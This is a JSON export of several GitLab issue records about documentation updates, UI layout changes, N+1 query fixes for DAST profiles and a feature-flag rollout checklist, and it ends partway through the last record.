[{"id":97788971,"iid":346332,"project_id":278964,"title":"Make instrumentation class docs visible in Service Ping guide","description":"When checking Service Ping guide we first see the tooling based on `usage_data.rb`. \n\nWe deprecated `usage_data.rb` in favor of using instrumentation classes. This should be reflected in our docs.\n\nWith this issue we want to update the Service Ping guide so that usage of instrumentation classes is more visible and easy to access, and move usage of usage_data.rb in lower visibility","state":"closed","created_at":"2021-11-23T08:35:09.754Z","updated_at":"2022-02-21T17:38:55.825Z","closed_at":"2022-02-21T17:38:44.243Z","closed_by":{"id":8200977,"username":"lmejia2","name":"Luis Mejia","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8200977/avatar.png","web_url":"https://gitlab.com/lmejia2"},"labels":["backend","devops::growth","documentation","group::product intelligence","missed:14.7","missed:14.8","section::growth","type::maintenance","workflow::production"],"milestone":{"id":2204140,"iid":71,"group_id":9970,"title":"14.9","description":"","state":"active","created_at":"2021-08-26T19:11:46.841Z","updated_at":"2022-03-22T13:29:17.028Z","due_date":"2022-03-17","start_date":"2022-02-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/71"},"assignees":[{"id":8200977,"username":"lmejia2","name":"Luis Mejia","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8200977/avatar.png","web_url":"https://gitlab.com/lmejia2"}],"author":{"id":5365921,"username":"alinamihaila","name":"Alina Mihaila","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5365921/avatar.png","web_url":"https://gitlab.com/alinamihaila"},"type":"ISSUE","assignee":{"id":8200977,"username":"lmejia2","name":"Luis Mejia","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8200977/avatar.png","web_url":"https://gitlab.com/lmejia2"},"user_notes_count":1,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346332","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346332","notes":"https://gitlab.com/api/v4/projects/278964/issues/346332/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346332/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346332","relative":"#346332","full":"gitlab-org/gitlab#346332"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":5971,"epic":{"id":268176,"iid":5971,"title":"Deprecate usage_data.rb","url":"/groups/gitlab-org/-/epics/5971","group_id":9970,"human_readable_end_date":"Mar 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":97787397,"iid":346331,"project_id":278964,"title":"Frontend: Change the pipeline editor fixed layout to full-width","description":"## Problem\n\nPipeline editor currently uses the smallest \"fixed\" layout page width 990px, which doesn't provide the optimal experience given the complexity of the UI.\n\n## Proposal\n\nhttps://design.gitlab.com/layout/grid#fixed-layout\n\nMake the pipeline editor \"fixed\" layout use \"full-width\".\n\n| Before (fixed at 990 px)| After (fixed at full-width) |\n| ------ | ------ |\n| ![image](/uploads/eb4d36dbd46a8dcc22f49d1bf53f7d01/image.png) | ![image](/uploads/0f2f61a88cb023e8c2b35315042e3ddb/image.png) |\n\n\n## Implementation\n\nThe breakdown for this feature is as follows:\n\n| Work Type | Description | Issue Link |\n| ------ | ------ |  ------ |\n| ~backend | Expose includes link (initial MVC) |  https://gitlab.com/gitlab-org/gitlab/-/issues/344937 |\n| ~frontend  | **Change the pipeline editor fixed layout to full-width**| :point_left: You are here |\n| ~frontend  | Introduce the feature flag and the empty drawer. | https://gitlab.com/gitlab-org/gitlab/-/issues/350721 |\n| ~frontend  | Pass down the content to the drawer and format it properly | https://gitlab.com/gitlab-org/gitlab/-/issues/350722 |\n| ~frontend  | Remember the open/closed state in local storage | https://gitlab.com/gitlab-org/gitlab/-/issues/350723 |\n| ~frontend | Add feature discovery popover | https://gitlab.com/gitlab-org/gitlab/-/issues/360111 |\n| ~frontend  | Roll out feature flag | https://gitlab.com/gitlab-org/gitlab/-/issues/357219 |\n| ~backend | Backend: Add toggle flag to UserCalloutFeatureNameEnum to allow for popover dismissal | https://gitlab.com/gitlab-org/gitlab/-/issues/365347 | \n| ~frontend | Store the pipeline editor popovers state in the database | https://gitlab.com/gitlab-org/gitlab/-/issues/360635 |\n| ~backend | Add messaging when files can't be fetched due to invalid CI configuration | https://gitlab.com/gitlab-org/gitlab/-/issues/360431 |","state":"closed","created_at":"2021-11-23T08:08:39.135Z","updated_at":"2022-06-15T14:08:59.534Z","closed_at":"2022-01-17T07:07:12.292Z","closed_by":{"id":7598233,"username":"mgandres","name":"Mireya Andres","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c96bce45a06f2dd722144db3f52456bf?s=80\u0026d=identicon","web_url":"https://gitlab.com/mgandres"},"labels":["Category:Pipeline Authoring","Deliverable","UI polish","UX","auto updated","candidate::14.7","devops::verify","feature::enhancement","frontend","group::pipeline authoring","needs weight","section::ops","severity::4","type::feature","usability","workflow::production"],"milestone":{"id":2156369,"iid":68,"group_id":9970,"title":"14.7","description":"","state":"active","created_at":"2021-07-21T17:39:41.786Z","updated_at":"2021-07-21T17:39:41.786Z","due_date":"2022-01-17","start_date":"2021-12-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/68"},"assignees":[{"id":7598233,"username":"mgandres","name":"Mireya Andres","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c96bce45a06f2dd722144db3f52456bf?s=80\u0026d=identicon","web_url":"https://gitlab.com/mgandres"}],"author":{"id":4706959,"username":"nadia_sotnikova","name":"Nadia Sotnikova","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4706959/avatar.png","web_url":"https://gitlab.com/nadia_sotnikova"},"type":"ISSUE","assignee":{"id":7598233,"username":"mgandres","name":"Mireya Andres","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c96bce45a06f2dd722144db3f52456bf?s=80\u0026d=identicon","web_url":"https://gitlab.com/mgandres"},"user_notes_count":17,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346331","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346331","notes":"https://gitlab.com/api/v4/projects/278964/issues/346331/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346331/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346331","relative":"#346331","full":"gitlab-org/gitlab#346331"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7064,"epic":{"id":380739,"iid":7064,"title":"Add `include:` file links to the pipeline editor","url":"/groups/gitlab-org/-/epics/7064","group_id":9970,"human_readable_end_date":"Jan 17, 2023","human_readable_timestamp":"\u003cstrong\u003e2\u003c/strong\u003e days remaining"},"iteration":{"id":40214,"iid":46,"sequence":7,"group_id":9970,"title":"Pipeline Authoring: Jan 10, 2022 – Jan 23, 2022","description":"Target milestone `14.8`","state":3,"created_at":"2021-11-14T00:05:01.884Z","updated_at":"2022-01-24T00:05:02.043Z","start_date":"2022-01-10","due_date":"2022-01-23","web_url":"https://gitlab.com/groups/gitlab-org/-/iterations/40214"},"health_status":"at_risk"},{"id":97785228,"iid":346328,"project_id":278964,"title":"Replace confirm danger modal in visibility modal","description":"As part of our effort to [replace bootstrap modals](https://gitlab.com/gitlab-org/gitlab/-/issues/254274), we should replace the existing [haml confirm_modal](https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/views/shared/_confirm_modal.html.haml) with a vue component, utilising GlModal.\n\nThis issue replaces the [remaining usages](https://gitlab.com/search?utf8=%E2%9C%93\u0026search=js-confirm-danger\u0026group_id=9970\u0026project_id=278964\u0026scope=\u0026search_code=true\u0026snippets=false\u0026repository_ref=master\u0026nav_source=navbar) of the confirm_modal, with our new vuejs modal introduced in https://gitlab.com/gitlab-org/gitlab/-/issues/342115.\n\nGiven the modal is used in some fairly sensitive parts of the codebase, it makes sense to migrate each instance in separate MRs, this should hopefully reduce any possible negative impacts.\n\n![Screen_Shot_2021-11-23_at_6.16.25_pm](/uploads/977bdb524155a4d302261458c4f517f8/Screen_Shot_2021-11-23_at_6.16.25_pm.png)\n\n## TODO\n\nThis issue is specifically for the confirm danger modal located in `app/views/projects/_visibility_modal.html.haml`\n\nRelated to #342116.","state":"closed","created_at":"2021-11-23T07:20:00.977Z","updated_at":"2021-11-24T04:09:09.196Z","closed_at":"2021-11-23T23:07:33.259Z","closed_by":{"id":3397881,"username":"ekigbo","name":"Ezekiel Kigbo","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3397881/avatar.png","web_url":"https://gitlab.com/ekigbo"},"labels":["auto updated","component:modal","devops::manage","frontend","group::optimize","pajamas::integrate","priority::2","section::dev","workflow::ready for development"],"milestone":{"id":2114820,"iid":67,"group_id":9970,"title":"14.6","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T05:00:52.094Z","updated_at":"2022-04-21T07:26:38.271Z","due_date":"2021-12-17","start_date":"2021-11-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/67"},"assignees":[{"id":3397881,"username":"ekigbo","name":"Ezekiel Kigbo","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3397881/avatar.png","web_url":"https://gitlab.com/ekigbo"}],"author":{"id":3397881,"username":"ekigbo","name":"Ezekiel Kigbo","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3397881/avatar.png","web_url":"https://gitlab.com/ekigbo"},"type":"ISSUE","assignee":{"id":3397881,"username":"ekigbo","name":"Ezekiel Kigbo","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3397881/avatar.png","web_url":"https://gitlab.com/ekigbo"},"user_notes_count":4,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346328","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346328","notes":"https://gitlab.com/api/v4/projects/278964/issues/346328/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346328/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":"https://gitlab.com/api/v4/projects/278964/issues/344561"},"references":{"short":"#346328","relative":"#346328","full":"gitlab-org/gitlab#346328"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":4386,"epic":{"id":111701,"iid":4386,"title":"Modals \u003e Haml \u003e Remove calls to bootstrap/jquery","url":"/groups/gitlab-org/-/epics/4386","group_id":9970,"human_readable_end_date":"Mar 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":97783962,"iid":346327,"project_id":278964,"title":"Investigate removing directory `app/assets/javascripts/pages/admin/services`","description":"`app/assets/javascripts/pages/admin/services` appears to be a left-over artifact of service templates (now removed).\n\nThis whole directory can probably be deleted, but let's check!","state":"closed","created_at":"2021-11-23T06:50:41.578Z","updated_at":"2022-11-22T19:11:25.549Z","closed_at":"2021-11-25T02:27:52.538Z","closed_by":{"id":259327,"username":"tomquirk","name":"Tom Quirk","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/259327/avatar.png","web_url":"https://gitlab.com/tomquirk"},"labels":["auto updated","devops::manage","frontend","group::integrations","maintenance::refactor","section::dev","type::maintenance","workflow::production"],"milestone":{"id":2114820,"iid":67,"group_id":9970,"title":"14.6","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T05:00:52.094Z","updated_at":"2022-04-21T07:26:38.271Z","due_date":"2021-12-17","start_date":"2021-11-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/67"},"assignees":[{"id":259327,"username":"tomquirk","name":"Tom Quirk","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/259327/avatar.png","web_url":"https://gitlab.com/tomquirk"}],"author":{"id":259327,"username":"tomquirk","name":"Tom Quirk","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/259327/avatar.png","web_url":"https://gitlab.com/tomquirk"},"type":"ISSUE","assignee":{"id":259327,"username":"tomquirk","name":"Tom Quirk","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/259327/avatar.png","web_url":"https://gitlab.com/tomquirk"},"user_notes_count":1,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346327","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346327","notes":"https://gitlab.com/api/v4/projects/278964/issues/346327/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346327/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346327","relative":"#346327","full":"gitlab-org/gitlab#346327"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":97781654,"iid":346325,"project_id":278964,"title":"Fix N+1 issues when associating DAST profiles and CI Builds","description":"## Problem Statement\n\nwhen `dast` profiles are associated with builds (see `yaml` below) there are two `N+1` issues when there are multiple builds with the `dast_configuration` keyword:\n\n1. associating profiles.\n2. finding profiles.\n\n```yaml\nstages:\n  - dast\ndast:\n  stage: dast\n  dast_configuration:\n    site_profile: Some site\n    scanner_profile: Some scanner\n  script:\n    - exit 0\ndast2:\n  stage: dast\n  dast_configuration:\n    site_profile: Another site\n    scanner_profile: Another scanner       \n  script:\n    - exit 0\n```\n\n## Proposed Solution\n\n- batch associate profiles.\n- batch load profiles.\n\n## Implementation Plan\n\nfollowing on from the work added in https://gitlab.com/gitlab-org/gitlab/-/merge_requests/74967:\n\n- [ ] extract service that takes a number of `builds` and `profiles` and associates them inside a single database insert.\n- [ ] extend finder to batch load profiles.","state":"closed","created_at":"2021-11-23T05:38:31.396Z","updated_at":"2022-05-16T16:19:45.955Z","closed_at":"2022-05-16T16:19:45.939Z","closed_by":{"id":9430722,"username":"mc_rocha","name":"Marcos Rocha","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9430722/avatar.png","web_url":"https://gitlab.com/mc_rocha"},"labels":["Category:DAST","backend","devops::secure","group::dynamic analysis","section::sec","workflow::in review"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":9430722,"username":"mc_rocha","name":"Marcos Rocha","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9430722/avatar.png","web_url":"https://gitlab.com/mc_rocha"}],"author":{"id":5749348,"username":"philipcunningham","name":"Philip Cunningham","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5749348/avatar.png","web_url":"https://gitlab.com/philipcunningham"},"type":"ISSUE","assignee":{"id":9430722,"username":"mc_rocha","name":"Marcos Rocha","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9430722/avatar.png","web_url":"https://gitlab.com/mc_rocha"},"user_notes_count":4,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346325","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":2,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 2 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346325","notes":"https://gitlab.com/api/v4/projects/278964/issues/346325/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346325/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346325","relative":"#346325","full":"gitlab-org/gitlab#346325"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6778,"epic":{"id":351939,"iid":6778,"title":"On-demand DAST improvements","url":"/groups/gitlab-org/-/epics/6778","group_id":9970,"human_readable_end_date":"Jan 17, 2023","human_readable_timestamp":"\u003cstrong\u003e2\u003c/strong\u003e days remaining"},"iteration":null,"health_status":null},{"id":97778444,"iid":346321,"project_id":278964,"title":"Remove redis_hll_tracking validation from usage_data.rb","description":"# Description \n\nBased on https://gitlab.slack.com/archives/CL3A7GFPF/p1636617059293500?thread_ts=1636558508.249600\u0026cid=CL3A7GFPF and Nov 23rd Product Intelligence Sync [discussion](https://docs.google.com/document/d/1b37c2SZJKK8Sr2IeKgdXdpnB77jnNjxDE13YmjHtfmU/edit)\n\nredis_hll_tracking  feature flag is added as ops FF and it is added to have a protection in case redis tracking will cause performance issues. This feature flag is checked at tracking level and when adding the data to service ping, in both cases there could appear performance issues. \n\nHowever, This feature flag was never used since we have the Redis HLL tracking.\n\nLet's remove the condition\n\n# Acceptance criteria\n\n- [ ] Remove the check for `redis_hll_tracking` feature flag from usage_data.rb\n\nRelated to #337060.","state":"closed","created_at":"2021-11-23T03:19:03.284Z","updated_at":"2021-11-30T16:00:33.407Z","closed_at":"2021-11-30T16:00:33.391Z","closed_by":{"id":8200977,"username":"lmejia2","name":"Luis Mejia","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8200977/avatar.png","web_url":"https://gitlab.com/lmejia2"},"labels":["auto updated","backend","devops::growth","group::product intelligence","section::growth","workflow::issue reviewed"],"milestone":{"id":2114820,"iid":67,"group_id":9970,"title":"14.6","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T05:00:52.094Z","updated_at":"2022-04-21T07:26:38.271Z","due_date":"2021-12-17","start_date":"2021-11-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/67"},"assignees":[{"id":8200977,"username":"lmejia2","name":"Luis Mejia","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8200977/avatar.png","web_url":"https://gitlab.com/lmejia2"}],"author":{"id":8200977,"username":"lmejia2","name":"Luis Mejia","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8200977/avatar.png","web_url":"https://gitlab.com/lmejia2"},"type":"ISSUE","assignee":{"id":8200977,"username":"lmejia2","name":"Luis Mejia","state":"blocked","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8200977/avatar.png","web_url":"https://gitlab.com/lmejia2"},"user_notes_count":5,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346321","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":1,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 1 checklist item completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346321","notes":"https://gitlab.com/api/v4/projects/278964/issues/346321/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346321/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346321","relative":"#346321","full":"gitlab-org/gitlab#346321"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":97770648,"iid":346308,"project_id":278964,"title":"[Feature flag] Rollout of `secure_vulnerability_training`","description":"\u003c!-- Title suggestion: [Feature flag] Enable description of feature --\u003e\n\n## Summary\n\nThis issue is to rollout [the feature](https://gitlab.com/groups/gitlab-org/-/epics/6176) on production,\nthat is currently behind the `secure_vulnerability_training ` feature flag.\n\n\u003c!-- Short description of what the feature is about and link to relevant other issues. --\u003e\n\n## Owners\n\n- Team: ~\"group::threat insights\" \n- Most appropriate slack channel to reach out to: `#g_secure_threat_insights`\n- Best individual to reach out to: @sming-gitlab @dpisek \n- PM: @matt_wilson \n\n## Stakeholders\n\n\u003c!--\nAre there any other stages or teams involved that need to be kept in the loop?\n\n- Name of a PM\n- The Support Team\n- The Delivery Team\n--\u003e\n\n## Expectations\n\n### What are we expecting to happen?\n\n\u003c!-- Describe the expected outcome when rolling out this feature --\u003e\n\n### When is the feature viable?\n\n\u003c!-- What are the settings we need to configure in order to have this feature viable? --\u003e\n\n\u003c!-- \nExample below:\n \n1. Enable service ping collection\n   `ApplicationSetting.first.update(usage_ping_enabled: true)`\n--\u003e\n\n### What might happen if this goes wrong?\n\n\u003c!-- Should the feature flag be turned off? Any MRs that need to be rolled back? Communication that needs to happen? What are some things you can think of that could go wrong - data loss or broken pages? --\u003e\n\n### What can we monitor to detect problems with this?\n\n\u003c!-- Which dashboards from https://dashboards.gitlab.net are most relevant? --\u003e\n_Consider mentioning checks for 5xx errors or other anomalies like an increase in redirects \n(302 HTTP response status)_\n\n### What can we check for monitoring production after rollouts?\n\n_Consider adding links to check for Sentry errors, Production logs for 5xx, 302s, etc._\n\n## Rollout Steps\n\n### Rollout on non-production environments\n\n- Ensure that the feature MRs have been deployed to non-production environments.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- [ ] Enable the feature globally on non-production environments.\n    - [ ] `/chatops run feature set \u003cfeature-flag-name\u003e true --dev`\n    - [ ] `/chatops run feature set \u003cfeature-flag-name\u003e true --staging`\n- [ ] Verify that the feature works as expected. Posting the QA result in this issue is preferable.\n\n### Specific rollout on production\n\n- Ensure that the feature MRs have been deployed to both production and canary.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- If you're using [project-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [ ] `/chatops run feature set --project=gitlab-org/gitlab secure_vulnerability_training true`\n    - [ ] `/chatops run feature set --project=gitlab-org/gitlab-foss secure_vulnerability_training true`\n    - [ ] `/chatops run feature set --project=gitlab-com/www-gitlab-com secure_vulnerability_training true`\n- If you're using [group-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [ ] `/chatops run feature set --group=gitlab-org secure_vulnerability_training true`\n    - [ ] `/chatops run feature set --group=gitlab-com secure_vulnerability_training true`\n- If you're using [user-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [ ] `/chatops run feature set --user=\u003cyour-username\u003e secure_vulnerability_training true`\n- [ ] Verify that the feature works on the specific entries. Posting the QA result in this issue is preferable.\n\n### Preparation before global rollout\n\n- [ ] Check if the feature flag change needs to be accompanied with a\n  [change management issue](https://about.gitlab.com/handbook/engineering/infrastructure/change-management/#feature-flags-and-the-change-management-process).\n  Cross link the issue here if it does.\n- [ ] Ensure that you or a representative in development can be available for at least 2 hours after feature flag updates in production.\n  If a different developer will be covering, or an exception is needed, please inform the oncall SRE by using the `@sre-oncall` Slack alias.\n- [ ] Ensure that documentation has been updated ([More info](https://docs.gitlab.com/ee/development/documentation/feature_flags.html#features-that-became-enabled-by-default)).\n- [ ] Announce on [the feature issue](ISSUE LINK) an estimated time this will be enabled on GitLab.com.\n- [ ] Notify `#support_gitlab-com` and your team channel ([more guidance when this is necessary in the dev docs](https://docs.gitlab.com/ee/development/feature_flags/controls.html#communicate-the-change)).\n\n### Global rollout on production\n\nFor visibility, all `/chatops` commands that target production should be executed in the `#production` slack channel and cross-posted (with the command results) to the responsible team's slack channel (`#g_TEAM_NAME`).\n\n- [ ] [Incrementally roll out](https://docs.gitlab.com/ee/development/feature_flags/controls.html#process) the feature.\n  - If the feature flag in code has [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform **actor-based** rollout.\n    - [ ] `/chatops run feature set secure_vulnerability_training \u003crollout-percentage\u003e --actors`\n  - If the feature flag in code does **NOT** have [an actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), perform time-based rollout (**random** rollout).\n    - [ ] `/chatops run feature set secure_vulnerability_training \u003crollout-percentage\u003e`\n  - Enable the feature globally on production environment.\n    - [ ] `/chatops run feature set secure_vulnerability_training true`\n- [ ] Announce on [the feature issue](ISSUE LINK) that the feature has been globally enabled.\n- [ ] Wait for [at least one day for the verification term](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release).\n\n### (Optional) Release the feature with the feature flag\n\nIf you're still unsure whether the feature is [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release)\nbut want to release it in the current milestone, you can change the default state of the feature flag to be enabled.\nTo do so, follow these steps:\n\n- [ ] Create a merge request with the following changes. Ask for review and merge it.\n    - [ ] Set the `default_enabled` attribute in [the feature flag definition](https://docs.gitlab.com/ee/development/feature_flags/#feature-flag-definition-and-validation) to `true`.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the default-enabling MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-default-enabling-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [ ] Set the next milestone to this rollout issue for scheduling [the flag removal](#release-the-feature).\n- [ ] (Optional) You can create a separate issue for scheduling the steps below to [Release the feature](#release-the-feature).\n    - [ ] Set the title to \"[Feature flag] Cleanup `secure_vulnerability_training`\".\n    - [ ] Execute the `/copy_metadata \u003cthis-rollout-issue-link\u003e` quick action to copy the labels from this rollout issue.\n    - [ ] Link this rollout issue as a related issue.\n    - [ ] Close this rollout issue.\n\n**WARNING:** This approach has the downside that it makes it difficult for us to\n[clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up) the flag.\nFor example, on-premise users could disable the feature on their GitLab instance. But when you\nremove the flag at some point, they suddenly see the feature as enabled and they can't roll it back\nto the previous behavior. To avoid this potential breaking change, use this approach only for urgent\nmatters.\n\n### Release the feature\n\nAfter the feature has been [deemed stable](https://about.gitlab.com/handbook/product-development-flow/feature-flag-lifecycle/#including-a-feature-behind-feature-flag-in-the-final-release),\nthe [clean up](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up)\nshould be done as soon as possible to permanently enable the feature and reduce complexity in the\ncodebase.\n\n\u003c!-- The checklist here is to help stakeholders keep track of the feature flag status --\u003e\n- [ ] Create a merge request to remove `secure_vulnerability_training` feature flag. Ask for review and merge it.\n    - [ ] Remove all references to the feature flag from the codebase.\n    - [ ] Remove the YAML definitions for the feature from the repository.\n    - [ ] Create [a changelog entry](https://docs.gitlab.com/ee/development/feature_flags/#changelog).\n- [ ] Ensure that the cleanup MR has been deployed to both production and canary.\n      If the merge request was deployed before [the code cutoff](https://about.gitlab.com/handbook/engineering/releases/#self-managed-releases-1),\n      the feature can be officially announced in a release blog post.\n    - [ ] `/chatops run auto_deploy status \u003cmerge-commit-of-cleanup-mr\u003e`\n- [ ] Close [the feature issue](ISSUE LINK) to indicate the feature will be released in the current milestone.\n- [ ] Clean up the feature flag from all environments by running these chatops command in `#production` channel:\n    - [ ] `/chatops run feature delete secure_vulnerability_training --dev`\n    - [ ] `/chatops run feature delete secure_vulnerability_training --staging`\n    - [ ] `/chatops run feature delete secure_vulnerability_training`\n- [ ] Close this rollout issue.\n\n## Rollback Steps\n\n- [ ] This feature can be disabled by running the following Chatops command:\n\n```\n/chatops run feature set secure_vulnerability_training false\n```","state":"closed","created_at":"2021-11-22T23:02:44.727Z","updated_at":"2022-04-25T03:22:31.967Z","closed_at":"2022-04-22T13:43:53.231Z","closed_by":{"id":3993566,"username":"sming-gitlab","name":"Samantha Ming","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3993566/avatar.png","web_url":"https://gitlab.com/sming-gitlab"},"labels":["devops::secure","feature flag","feature::addition","frontend","group::threat insights","missed:14.6","missed:14.8","section::sec","type::feature","workflow::in review"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":3993566,"username":"sming-gitlab","name":"Samantha 